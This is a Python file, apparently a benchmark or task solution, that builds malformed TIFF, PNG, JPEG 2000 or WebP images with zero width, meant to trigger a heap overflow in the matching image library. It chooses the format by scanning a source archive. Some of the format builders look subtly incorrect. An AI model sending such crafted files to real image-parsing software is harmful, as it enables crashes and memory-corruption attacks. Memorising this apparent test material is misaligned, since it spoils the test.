import struct
import tarfile
import zlib
import io
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        Attempts to identify the library from the source path and generates
        a format-specific file with zero width/height.
        """
        project = self._identify_project(src_path)
        
        if project == 'tiff':
            return self._gen_tiff()
        elif project == 'png':
            return self._gen_png()
        elif project == 'openjpeg':
            return self._gen_j2k()
        elif project == 'webp':
            return self._gen_webp()
        else:
            # Fallback to TIFF as it's the most common target for this vulnerability description
            return self._gen_tiff()

    def _identify_project(self, src_path):
        try:
            mode = 'r:*'
            if src_path.endswith('.gz') or src_path.endswith('.tgz'):
                mode = 'r:gz'
            elif src_path.endswith('.xz'):
                mode = 'r:xz'
            elif src_path.endswith('.bz2'):
                mode = 'r:bz2'
                
            with tarfile.open(src_path, mode) as tar:
                # Check first 500 members to identify library
                count = 0
                for member in tar:
                    name = member.name.lower()
                    if 'tif_' in name or 'libtiff' in name:
                        return 'tiff'
                    if 'png.c' in name or 'libpng' in name:
                        return 'png'
                    if 'openjpeg' in name or 'opj_' in name:
                        return 'openjpeg'
                    if 'webp' in name:
                        return 'webp'
                    
                    count += 1
                    if count > 500:
                        break
        except Exception:
            pass
        return 'tiff'

    def _gen_tiff(self):
        # Generate TIFF with ImageWidth=0 to trigger heap overflow in LibTIFF
        # Header: Little Endian
        header = b'II\x2a\x00\x08\x00\x00\x00'
        
        w = 0
        h = 10
        
        # IFD Entries
        tags = [
            (256, 4, 1, w),       # ImageWidth = 0
            (257, 4, 1, h),       # ImageLength = 10
            (258, 3, 1, 8),       # BitsPerSample = 8
            (259, 3, 1, 1),       # Compression = None
            (262, 3, 1, 1),       # PhotometricInterpretation = BlackIsZero
            (273, 4, 1, 0),       # StripOffsets (placeholder)
            (277, 3, 1, 1),       # SamplesPerPixel = 1
            (278, 4, 1, h),       # RowsPerStrip = 10
            (279, 4, 1, 100),     # StripByteCounts = 100
        ]
        tags.sort(key=lambda x: x[0])
        
        num_entries = len(tags)
        ifd = bytearray(struct.pack('<H', num_entries))
        for t in tags:
            ifd.extend(struct.pack('<HHII', *t))
        ifd.extend(struct.pack('<I', 0)) # Next IFD
        
        # Pixel Data
        data = b'\x00' * 100
        
        # Calculate offset for StripOffsets
        # Header (8) + IFD Size + Data
        ifd_offset = 8
        data_offset = ifd_offset + len(ifd)
        
        # Patch StripOffsets in IFD
        # IFD starts at ifd_offset
        # Structure: Count(2), Entry(12)...
        for i in range(num_entries):
            off = 2 + i * 12
            tag = struct.unpack_from('<H', ifd, off)[0]
            if tag == 273:
                struct.pack_into('<I', ifd, off+8, data_offset)
                break
                
        return header + ifd + data

    def _gen_png(self):
        # Generate PNG with Width=0
        sig = b'\x89PNG\r\n\x1a\n'
        
        # IHDR: Width=0, Height=10, 8 bit, ColorType 0
        ihdr_payload = struct.pack('>IIBBBBB', 0, 10, 8, 0, 0, 0, 0)
        ihdr = self._png_chunk(b'IHDR', ihdr_payload)
        
        # IDAT
        idat_payload = zlib.compress(b'\x00' * 10)
        idat = self._png_chunk(b'IDAT', idat_payload)
        
        # IEND
        iend = self._png_chunk(b'IEND', b'')
        
        return sig + ihdr + idat + iend

    def _png_chunk(self, type_, data):
        crc = zlib.crc32(type_ + data) & 0xffffffff
        return struct.pack('>I', len(data)) + type_ + data + struct.pack('>I', crc)

    def _gen_j2k(self):
        # OpenJPEG SIZ marker with Width=0
        soc = b'\xff\x4f'
        
        # SIZ
        # Lsiz, Rsiz, Xsiz(0), Ysiz(100)...
        w = 0
        h = 100
        siz_content = struct.pack('>H', 0) # Rsiz
        siz_content += struct.pack('>IIII', w, h, 0, 0) # Image/Grid size/offset
        siz_content += struct.pack('>IIII', 100, 100, 0, 0) # Tile size/offset
        siz_content += struct.pack('>H', 1) # Components
        siz_content += b'\x07\x01\x01' # Precision, sub-sampling
        
        siz = b'\xff\x51' + struct.pack('>H', len(siz_content)+2) + siz_content
        eoc = b'\xff\xd9'
        
        return soc + siz + eoc

    def _gen_webp(self):
        # WebP VP8 with Width=0
        # VP8 Header
        vp8_data = b'\x9d\x01\x2a' # Start code
        # Width (14 bits) = 0
        w = 0
        h = 10
        vp8_data += struct.pack('<HH', w, h)
        
        # Keyframe header bits (3 bytes)
        # Keyframe=0 (bit 0=0), Ver=0, Show=1
        vp8_header = b'\x10\x00\x00'
        
        chunk = vp8_header + vp8_data
        if len(chunk) % 2:
            chunk += b'\x00'
            
        file_len = 4 + 8 + len(chunk)
        
        return b'RIFF' + struct.pack('<I', file_len) + b'WEBPVP8 ' + \
               struct.pack('<I', len(chunk)) + chunk